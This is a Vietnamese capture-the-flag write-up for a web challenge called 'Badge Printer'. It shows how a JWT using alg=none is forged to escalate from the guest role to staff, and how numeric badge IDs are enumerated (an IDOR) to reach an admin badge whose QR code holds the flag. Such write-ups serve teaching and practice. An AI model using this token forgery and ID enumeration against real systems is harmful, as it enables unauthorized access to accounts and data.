# Badge Printer - Writeup

## 1. Mở trang login

Truy cập:

```text
/login
```

Form login gợi ý credential guest:

```text
guest / guest
```

## 2. Đăng nhập guest

Sau khi đăng nhập, server set cookie:

```text
session=<jwt>
```

## 3. Decode JWT

Copy cookie `session` đưa vào `jwt.io`, CyberChef hoặc Burp Decoder.

Header:

```json
{"alg":"none","typ":"JWT"}
```

Payload:

```json
{"user":"guest","role":"guest","badge_id":"1"}
```

## 4. Nhận ra JWT misconfiguration

JWT dùng:

```text
alg=none
```

Server chấp nhận token `none` và không verify chữ ký.

## 5. Sửa role thành staff

Đổi payload thành:

```json
{"user":"guest","role":"staff","badge_id":"1"}
```

Token dạng `alg=none` có thể ghép như sau:

```text
base64url(header).base64url(payload).
```

## 6. Ghi token mới vào cookie

Set cookie `session` bằng token staff rồi reload.

## 7. Vào staff console

Truy cập:

```text
/badges
```

Trang staff chỉ liệt kê hai badge:

```text
badge #1
badge #2
```

## 8. Nhận ra khả năng IDOR

Badge detail dùng tham số:

```text
/badge?id=1
```

Do ID là số và staff queue chỉ hiển thị một phần dữ liệu, có thể thử các ID khác.

## 9. Brute force ID badge

Thử lần lượt:

```text
/badge?id=3
/badge?id=4
...
```
Buteforce

Kết quả:

```text
admin id: 17
```

## 10. Mở badge admin

```text
/badge?id=17
```

Trang trả về:

```text
Admin Night Shift
Security Operations
badge #17
```

## 11. Tải hoặc mở QR admin

```text
/badge/qr?id=17
```

Có thể bấm `Download QR SVG` hoặc mở trực tiếp endpoint này.

## 12. Quét QR

Quét QR bằng điện thoại hoặc tool đọc QR.

Payload QR trả về trực tiếp flag:

```text
blockChainPTIT{jwt_idor_qr_badge}
```
